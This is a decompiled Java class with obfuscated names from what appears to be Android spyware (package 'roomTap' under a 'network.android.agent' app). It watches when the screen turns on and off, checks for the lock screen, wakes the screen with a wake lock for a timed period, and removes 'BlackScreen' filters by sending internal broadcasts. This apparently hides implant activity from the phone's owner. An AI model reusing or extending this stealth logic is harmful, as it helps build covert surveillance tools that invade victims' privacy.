package com.network.android.roomTap;

import android.app.KeyguardManager;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.Handler;
import android.os.HandlerThread;
import android.os.PowerManager;
import com.network.android.agent.NetworkApp;
import com.network.android.c.a.a;

public final class k {

    /* renamed from: a  reason: collision with root package name */
    public static boolean f122a = true;
    public static boolean b = false;
    public static boolean c = false;
    public static boolean d = false;
    public static boolean e = false;
    public static PowerManager.WakeLock f;
    private static long g = (System.currentTimeMillis() / 1000);
    private static Handler h = new Handler();
    private static long i = (System.currentTimeMillis() / 1000);
    private static Context j;
    private static Handler k;
    private static BroadcastReceiver l = new l();

    static {
        HandlerThread handlerThread = new HandlerThread("screenActivityHandler");
        handlerThread.start();
        k = new Handler(handlerThread.getLooper());
    }

    public static void a() {
        j.unregisterReceiver(l);
    }

    public static void a(Context context) {
        j = context;
        IntentFilter intentFilter = new IntentFilter("android.intent.action.SCREEN_ON");
        intentFilter.addAction("android.intent.action.SCREEN_OFF");
        j.registerReceiver(l, intentFilter);
        try {
            d = ((Boolean) PowerManager.class.getMethod("isScreenOn", null).invoke((PowerManager) j.getSystemService("power"), null)).booleanValue();
        } catch (Exception e2) {
            d = true;
        }
        if (d) {
            i = System.currentTimeMillis() / 1000;
        } else {
            g = System.currentTimeMillis() / 1000;
        }
    }

    public static void a(Context context, int i2) {
        try {
            a.a("turnScreenOnForLimitedTime start. time to run: " + i2);
            PowerManager.WakeLock newWakeLock = ((PowerManager) context.getSystemService("power")).newWakeLock(268435466, "TAG");
            f = newWakeLock;
            newWakeLock.acquire();
            a.a("turnScreenOnForLimitedTime turned screen on");
            k.postDelayed(new p(), (long) i2);
        } catch (Throwable th) {
            a.a("turnScreenOnForLimitedTime- " + th.getMessage(), th);
        }
        a.a("turnScreenOnForLimitedTime end");
    }

    public static void b() {
        a.a("BlackScreen in removeScreenFilters ");
        f122a = false;
        NetworkApp.a().sendBroadcast(new Intent("com.network.showdesktop"));
        NetworkApp.a().sendBroadcast(new Intent("stop_filter_event"));
        new Handler().postDelayed(new o(), 10000);
    }

    public static boolean b(Context context) {
        return ((KeyguardManager) context.getSystemService("keyguard")).inKeyguardRestrictedInputMode();
    }

    public static long c() {
        return g;
    }
}
